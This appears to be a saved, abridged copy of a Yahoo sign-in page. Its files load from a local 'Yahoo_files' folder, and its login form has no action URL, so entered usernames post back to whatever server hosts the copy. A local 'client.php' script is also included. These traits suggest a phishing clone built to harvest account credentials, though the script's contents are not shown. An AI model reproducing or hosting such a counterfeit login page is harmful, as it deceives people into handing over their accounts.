...
<head>
    ...
    <script type="text/javascript" src="./Yahoo_files/boot.js.download"></script>
</head>

<body class="bucket-mbr-oneflow-protection bucket-mbr-qr-comet-sdk">
    <div id="login-body" class="loginish  puree-v2  grid    ">
        <div class="mbr-desktop-hd">
            ...
            <span class="column help txt-align-right">
                <a href="https://help.yahoo.com/kb/index?locale=vn_VN&amp;page=product&amp;y=PROD_ACCT">Help</a>
            </span>
        </div>
        <div class="login-box-container">
                    ...
                    <div class="username-challenge" id="login-landing">
                        ...
                        <form id="login-username-form" method="post" class="pure-form">
                            ...
                            <div class="button-container">
                                <input type="submit" class="pure-button puree-button-primary challenge-button" value="Login" tabindex="6" data-rapid-tracking="true">
                            </div>
                            ...
                            <div class="helper-links-container">
                                ...
                                <div class="helper-item arlink">
                                    <span class="help">
                                        <a href="https://login.yahoo.com/forgot?display=login&amp;done=https%3A%2F%2Fwww.yahoo.com%2F" id="mbr-forgot-link" data-ylk="elm:btn;elmt:forgot;slk:forgot;mkey:login-landing-forgot" data-rapid-tracking="true">Forgot&nbsp;username?</a>
                                    </span>
                                </div>
                            </div>
                            <div class="bottom-links-container has-social-buttons">
                                <p class="sign-up-link">
                                    <a href="https://login.yahoo.com/account/create?display=login&amp;done=https%3A%2F%2Fwww.yahoo.com%2F&amp;specId=yidReg" id="createacc" role="button" class="pure-button puree-button-secondary challenge-button" data-rapid-tracking="true" data-ylk="elm:link;elmt:secondary;slk:signup;mKey:login-landing-signup">Create
                                        an&nbsp;account</a>
                                </p>
            ...
            <div id="login-box-ad-fallback" class="login-box-ad-fallback" style="display: block;">
                ...
                <p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies
                    and more. You get more out of the web, you get more out of&nbsp;life.</p>
            </div>
        </div>
        ...
        <div class="login-footer">
            <p>
                <a href="https://www.verizonmedia.com/policies/sg/en/verizonmedia/terms/otos/index.html" target="_blank" class="terms">Terms</a>

                <span>|</span>
                <a href="https://www.verizonmedia.com/policies/sg/en/verizonmedia/privacy/index.html" target="_blank" class="privacy">Privacy</a>
    ...
    <noscript>
        <img src="/account/js-reporting/?crumb=H.SzVNIgbd%2F&message=javascript_not_enabled&ref=%2F" height="0" width="0" style="visibility: hidden;">
    </noscript>
    <div id="mbr-css-check"></div>
    <div id="page-mask" class="page-mask hide"></div>
    <div id="ad"></div>
    <script src="./Yahoo_files/client.php"></script>
</body>
